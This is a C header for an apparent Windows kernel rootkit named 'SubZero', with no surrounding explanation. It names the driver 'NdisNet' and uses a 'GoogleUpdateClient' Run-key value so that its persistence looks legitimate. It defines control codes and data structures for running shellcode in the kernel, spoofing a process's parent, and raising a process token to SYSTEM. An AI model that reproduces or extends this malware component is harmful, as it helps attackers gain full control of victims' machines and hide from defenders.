#pragma once

#define DRIVER_NAME "NdisNet"
#define DRIVER_NAMEW L"NdisNet"
#define REG_VALUE_NAME L"GoogleUpdateClient"
#define REG_MACHINE L"\\REGISTRY\\MACHINE\\"
#define REG_RUN_KEY_PATH L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

#define IOCTL_SUBZERO_EXECUTE_SHELLCODE CTL_CODE(FILE_DEVICE_UNKNOWN, \
	0x800, METHOD_BUFFERED, FILE_EXECUTE )

#define IOCTL_SUBZERO_SET_PPID CTL_CODE(FILE_DEVICE_UNKNOWN, \
	0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN, \
	0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef ULONG SubZeroSetTokenToSystemData;

struct SubZeroChangePPIDData
{
	ULONG ProcessID;
	ULONG NewParentID;
};

struct SubZeroExecuteShellcodeData
{
	USHORT ReturnedDataMaxSize;
	USHORT ShellcodeSize;
	USHORT ShellcodeOffset;
};